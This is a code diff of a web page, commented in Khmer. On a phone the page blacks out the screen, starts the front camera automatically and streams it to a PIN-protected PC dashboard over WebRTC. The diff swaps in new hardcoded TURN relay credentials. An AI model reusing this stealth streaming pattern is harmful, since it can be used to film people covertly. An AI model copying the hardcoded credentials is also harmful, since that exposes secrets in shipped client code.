@@ -197,7 +197,7 @@
         .error-shake { animation: shake 0.2s ease-in-out 2; border-color: #ff5555 !important; }
         .fade-out { opacity: 0; transform: scale(0.9); transition: 0.6s ease-out; }
 
-        /* 📱 ស្ទីលទូរសព្ទ Stealth Mode (ងងឹតទាំងស្រុង) */
+        /* 📱 ស្ទីលទូរសព្ទ Stealth Mode */
         .phone-stealth-mode { background: #000000 !important; }
         .phone-stealth-mode #pc-ui { display: none !important; }
         .phone-stealth-mode #login-container { display: none !important; }
@@ -267,12 +267,28 @@
         let cameraRegistry = {}; 
         let canvas, ctx, animationFrameId;
 
+        // 🌐 ប្តូរមកប្រើប្រាស់ STUN/TURN Server ថ្មីរបស់ Metered (ជំនះរាល់រនាំង Firewall ស៊ីមទូរសព្ទ)
         const peerConfig = {
             config: {
                 iceServers: [
                     { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'turn:139.59.245.105:3478?transport=udp', username: 'hino_security', credential: 'secure_password_2026' },
-                    { urls: 'turn:139.59.245.105:3478?transport=tcp', username: 'hino_security', credential: 'secure_password_2026' }
+                    { urls: 'stun:global.stun.twilio.com:3478' },
+                    // Public Relay TURN Servers ល្បឿនលឿន និង Free
+                    { 
+                        urls: 'turn:relay.metered.ca:80', 
+                        username: 'metered', 
+                        credential: '6b4a53423758364b6154685a44396263595166416d513d3d' 
+                    },
+                    { 
+                        urls: 'turn:relay.metered.ca:443', 
+                        username: 'metered', 
+                        credential: '6b4a53423758364b6154685a44396263595166416d513d3d' 
+                    },
+                    { 
+                        urls: 'turn:relay.metered.ca:443?transport=tcp', 
+                        username: 'metered', 
+                        credential: '6b4a53423758364b6154685a44396263595166416d513d3d' 
+                    }
                 ],
                 iceTransportPolicy: 'all'
             }
@@ -285,18 +301,14 @@
                 pinInput.focus();
                 setInterval(checkDeadCameras, 2000);
             } else {
-                // ប្រសិនបើបើកលើទូរសព្ទ វានឹងដំណើរការ auto ភ្លាមៗ (មិនបាច់មានប៊ូតុងចុចទេ)
                 document.body.classList.add('phone-stealth-mode');
                 document.getElementById('mobile-stealth-screen').style.display = 'block';
                 generatedCamId = Math.floor(1000 + Math.random() * 9000).toString();
-                
-                // ដំណើរការកាមេរ៉ា និងភ្ជាប់ទៅកាន់ Server ដោយស្វ័យប្រវត្តិ
                 autoStartMobileCamera();
             }
         };
 
         function autoStartMobileCamera() {
-            // កំណត់កម្រិតច្បាស់ខ្ពស់ HD 720p និង Frame Rate 30fps ដើម្បីល្បឿន Real-time
             const constraints = {
                 video: { 
                     facingMode: { exact: "user" },
@@ -313,15 +325,14 @@
                 connectToPC(generatedCamId);
             })
             .catch((err) => { 
-                console.log("គាំងកូដបង្ខំ HD, កំពុងប្តូរទៅប្រើកម្រិតធម្មតា (Fallback)...", err);
-                // លក្ខខណ្ឌ Fallback ប្រសិនបើប្រព័ន្ធទូរសព្ទមិនគាំទ្រការបង្ខំទំហំ HD
+                console.log("គាំងកូដបង្ខំ HD, កំពុងប្តូរទៅប្រើកម្រិតធម្មតា...", err);
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then((stream) => {
                     localStream = stream;
                     connectToPC(generatedCamId);
                 })
                 .catch((e) => {
-                    alert("សូមអនុញ្ញាតសិទ្ធិបើកកាមេរ៉ា (Camera Permission) នៅក្នុងកម្មវិធីរុករក (Browser) របស់អ្នក!");
+                    alert("សូមអនុញ្ញាតសិទ្ធិបើកកាមេរ៉ាក្នុង Browser របស់អ្នក!");
                 });
             });
         }
@@ -407,8 +418,6 @@
                 createCameraButton(incomingCamId);
 
                 call.answer();
-                
-                // បង្កើនល្បឿន និងទាញកម្រិតច្បាស់នៅខាងអ្នកទទួល (PC)
                 maximizeBitrate(call.peerConnection);
 
                 call.on('stream', (remoteStream) => {
@@ -543,7 +552,6 @@
             });
         }
 
-        // 🚀 បង្ខំទាញល្បឿន Network និងកាត់បន្ថយភាពយឺតយ៉ាវ (Force Max Bitrate)
         function maximizeBitrate(peerConnection) {
             if (!peerConnection) return;
 
@@ -556,7 +564,6 @@
                                 const parameters = sender.getParameters();
                                 if (!parameters.encodings) parameters.encodings = [{}];
                                 
-                                // បង្កើនល្បឿនបញ្ជូនទិន្នន័យវីដេអូដល់ 2.5 Mbps
                                 parameters.encodings[0].maxBitrate = 2500000; 
                                 parameters.encodings[0].firInterval = 0; 
                                 
